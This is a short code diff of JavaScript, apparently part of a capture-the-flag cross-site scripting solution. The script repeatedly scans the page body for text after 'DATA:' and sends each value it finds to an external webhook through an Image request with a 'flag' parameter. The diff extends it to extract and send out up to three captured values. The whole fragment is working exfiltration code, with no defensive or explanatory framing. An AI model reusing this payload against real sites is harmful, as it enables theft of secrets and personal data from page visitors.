@@ -12,8 +12,14 @@
 
         const catchInterval = setInterval(() => {
             if (document.body.innerHTML.includes("DATA:")) {
-                const rawSec = document.body.innerHTML.split("DATA:")[1].split("<")[0];
-                const safeSec = encodeURIComponent(rawSec);
+                rawSec = document.body.innerHTML.split("DATA:")[1].split("<")[0];
+                safeSec = encodeURIComponent(rawSec);
+                (new Image()).src = webhook + "?flag=" + safeSec;
+                rawSec = document.body.innerHTML.split("DATA:")[2].split("<")[0];
+                safeSec = encodeURIComponent(rawSec);
+                (new Image()).src = webhook + "?flag=" + safeSec;
+                rawSec = document.body.innerHTML.split("DATA:")[3].split("<")[0];
+                safeSec = encodeURIComponent(rawSec);
                 (new Image()).src = webhook + "?flag=" + safeSec;
                 clearInterval(catchInterval);
             }
